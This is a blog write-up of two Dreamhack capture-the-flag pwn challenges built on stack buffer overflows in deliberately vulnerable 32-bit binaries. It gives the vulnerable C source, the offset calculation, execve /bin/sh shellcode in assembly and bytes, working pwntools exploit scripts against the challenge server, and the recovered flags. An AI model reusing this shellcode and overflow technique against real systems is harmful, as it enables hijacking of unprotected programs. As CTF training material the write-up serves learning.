---
title: "[DREAMHACK] - Basic exploitation series"
published: 2024-12-01
description: ""
image: "../../image.png"
tags:
  - PWN
category: "Wargame"
draft: false
---

## basic_exploitation_00

### Analysis

Let's take a look at the binary:

```bash
➜  basic_exploitation_00 file basic_exploitation_000
basic_exploitation_000: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=a0b1247f86255866edcc25bf1af6c782a3d29975, not stripped
➜  basic_exploitation_00 checksec --file=basic_exploitation_000
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   79 Symbols        No    0               1               basic_exploitation_000

```

A 32-bit LSB executable file with no stack canary, so we can be able to smash the stack

Let's look at the source code:

```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}

int main(int argc, char *argv[]) {

    char buf[0x80];

    initialize();

    printf("buf = (%p)\\n", buf);
    scanf("%141s", buf);

    return 0;
}
```

So in the main() function there's a vuln here `scanf("%141s", buf);`. The buf just can contain 0x80 byte but our input is 141 bytes so there's a buffer overflow vulnerability.

The idea of this challenge is crafting the shellcode and make it execute by triggering the return address to make it return to our buffer started address have leaked while we run the binary

```bash
➜  basic_exploitation_00 ./basic_exploitation_000
buf = (0xff997ff8)
hello

```

But first things we need to do is find the offset between our input and eip (this is a 32-bit binary)

```nasm
gef➤  tel
0xffffcb80│+0x0000: 0x080486a5  →  "%141s"       ← $esp
0xffffcb84│+0x0004: 0xffffcb88  →  "hello"
0xffffcb88│+0x0008: "hello"
0xffffcb8c│+0x000c: 0x0000006f ("o"?)
0xffffcb90│+0x0010: 0x00000000
0xffffcb94│+0x0014: 0x00000001
0xffffcb98│+0x0018: 0xf7ffda20  →  0x00000000
0xffffcb9c│+0x001c: 0x00000000
0xffffcba0│+0x0020: 0x00000000
0xffffcba4│+0x0024: 0xffffce0b  →  0x98bb4ff4

```

We can see our input start at `0xffffcb88` and the saved eip is `0xffffcc0c` so we can calculate the offset is `0x84`

### Exploit

As the idea above, we need to craft the shellcode, so the first thing we need to do is write an assembly code to use execve() syscall to get shell:

```nasm
section .text
    global _start

_start:
    xor eax, eax; safe null
    push eax; push null byte onto stack
    push 0x68732f2f ; push /bin//sh
    push 0x6e69622f
    mov ebx,esp ; set ebx to out cmd
    xor ecx, ecx; no args
    xor edx, edx ; no args again
    mov al, 0xb ; set sys_execve
    int 0x80

; nasm -f elf shellcode.asm
; ld -m elf_i386 -o shellcode shellcode.o
;  objdump -d shellcode | grep "^ " | cut -f2 | tr -d ' ' | tr -d '\\n' | sed 's/.\\{2\\}/&\\\\x /g'| head -c-3 | tr -d ' ' && echo ' '

```

And our exploit will look like this:

```python
#!/usr/bin/python3

from pwn import *

# context.log_level = 'debug'
exe = context.binary = ELF('./basic_exploitation_000', checksec=False)

# Shorthanding functions for input/output
info = lambda msg: log.info(msg)
s = lambda data: p.send(data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
sla = lambda msg, data: p.sendlineafter(msg, data)
sn = lambda num: p.send(str(num).encode())
sna = lambda msg, num: p.sendafter(msg, str(num).encode())
sln = lambda num: p.sendline(str(num).encode())
slna = lambda msg, num: p.sendlineafter(msg, str(num).encode())
r = lambda: p.recv()
rl = lambda: p.recvline()
rall = lambda: p.recvall()

# GDB scripts for debugging
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''

c
''')

p = remote('host3.dreamhack.games',19046) if args.REMOTE else process(argv=[exe.path], aslr=False)
if args.GDB:
    GDB()
    input()

# ===========================================================
#                          EXPLOIT
# ===========================================================

buf = int(p.recv()[7:17],16)
print("buf address : "+hex(buf))

payload = b"\\x90"*6
payload += b"\\x31\\xc0\\x50\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x31\\xc9\\x31\\xd2\\xb0\\x08\\x40\\x40\\x40\\xcd\\x80"
payload += b"\\x90"*100 # nop
payload += p32(buf)

p.sendline(payload)

p.interactive()

```

```bash
➜  basic_exploitation_00 python3 exploit.py REMOTE
[+] Opening connection to host3.dreamhack.games on port 19046: Done
buf address : 0xfff90548
[*] Switching to interactive mode
$ cat flag
DH{465dd453b2a25a26a847a93d3695676d}$
```

## basic_exploitation_001

### Analysis

This challenge is the same as above but more easy to exploit
So let's take a quick look at the source code:

```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}

void read_flag() {
    system("cat /flag");
}

int main(int argc, char *argv[]) {

    char buf[0x80];

    initialize();

    gets(buf);

    return 0;
}

```

So our target is `read_flag()` function by using `gets()` function we can easily tell the our program to execute that function

A step to find offset is the same as `basic_exploitation_000`

### Exploit

```python
from pwn import *

p = remote('host3.dreamhack.games', 10179)
exe = ELF('./basic_exploitation_001', checksec = False)

pl = b'A'*132
pl+= p32(exe.sym['read_flag'])

p.sendline(pl)
p.interactive()

```

```bash
➜  basic_exploitation_1 python3 exploit.py
[+] Opening connection to host3.dreamhack.games on port 10179: Done
[*] Switching to interactive mode
DH{01ec06f5e1466e44f86a79444a7cd116}[*] Got EOF while reading in interactive

```
